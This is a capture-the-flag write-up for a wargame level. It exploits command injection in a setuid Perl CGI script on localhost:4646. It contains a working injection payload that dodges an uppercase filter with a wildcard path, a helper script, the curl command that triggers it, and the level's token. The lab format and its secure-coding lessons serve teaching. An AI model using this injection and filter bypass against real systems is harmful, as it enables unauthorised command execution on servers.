# level12

## Goal

Exploit a vulnerable Perl CGI script to execute commands as `flag12` and retrieve the token for `level13`.

---

## Recon

Files in the home directory:

```bash
ls -la
```

Interesting file:

```text
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

The script also indicates a local service:

```perl
# localhost:4646
```

---

## Source Code Analysis

Relevant code:

```perl
use CGI qw{param};

sub t {
  $nn = $_[1];
  $xx = $_[0];

  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;

  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  ...
}

n(t(param("x"), param("y")));
```

The user-controlled parameter `x` is inserted directly into a shell command:

```bash
egrep "^$xx" /tmp/xd 2>&1
```

Before execution, the input is transformed:

```perl
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
```

This means:

* lowercase letters become uppercase;
* everything after whitespace is removed;
* shell metacharacters are still usable.

---

## Vulnerability

The script is vulnerable to **command injection** through the `x` parameter.

The dangerous part is:

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

Because Perl backticks execute the command through a shell, an attacker can inject shell syntax by closing the double quote and appending another command.

---

## Filter Bypass

A direct payload using `/tmp/...` fails because:

```text
/tmp/x
```

becomes:

```text
/TMP/X
```

To bypass this, create an uppercase executable in `/tmp`:

```bash
cat > /tmp/X << 'EOF'
#!/bin/bash
getflag > /tmp/out
EOF

chmod +x /tmp/X
```

Then call it using a wildcard:

```text
/*/X
```

This avoids writing `/tmp` directly. The shell expands it to a matching path such as:

```text
/tmp/X
```

---

## Exploitation

The intended vulnerable service is running on port `4646`.

Payload logic:

```text
";/*/X;#
```

Explanation:

```text
"    closes the quoted egrep pattern
;    starts a new command
/*/X executes the attacker-controlled script
;    ends the command
#    comments out the rest of the original command
```

URL-encoded payload:

```text
%22%3B/*/X%3B%23
```

Run:

```bash
curl 'http://localhost:4646/?x=%22%3B/*/X%3B%23'
```

Then read the output:

```bash
cat /tmp/out
```

Output:

```text
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Use the token to switch to the next level:

```bash
su level13
```

---

## Important Observation

Testing on port `4747` executed the payload as `www-data` or `level12`, which did not provide the flag.

The correct service was the one indicated in the script comment:

```perl
# localhost:4646
```

Running the exploit against `localhost:4646` executed the command in the expected `flag12` context.

---

## Why It Works

The script builds a shell command using unsanitized user input:

```bash
egrep "^USER_INPUT" /tmp/xd 2>&1
```

By injecting a double quote, the attacker escapes the quoted string. Then shell metacharacters allow execution of an arbitrary command.

The uppercase transformation prevents simple lowercase paths, but wildcard expansion allows the attacker to reference `/tmp/X` without writing `/tmp` directly.

---

## Security Lessons

* Never concatenate user input into shell commands.
* Perl backticks execute through a shell and are dangerous with unsanitized input.
* Input transformations such as uppercasing are not security controls.
* Shell metacharacters must be properly escaped or avoided.
* Use safe APIs instead of invoking external commands when possible.
* CGI scripts should not execute with elevated privileges unless strictly necessary.

---

## Useful Commands

Create payload script:

```bash
cat > /tmp/X << 'EOF'
#!/bin/bash
getflag > /tmp/out
EOF

chmod +x /tmp/X
```

Trigger injection:

```bash
curl 'http://localhost:4646/?x=%22%3B/*/X%3B%23'
```

Read token:

```bash
cat /tmp/out
```

---

## Vulnerability Category

* Command Injection
* CWE-77: Improper Neutralization of Special Elements used in a Command
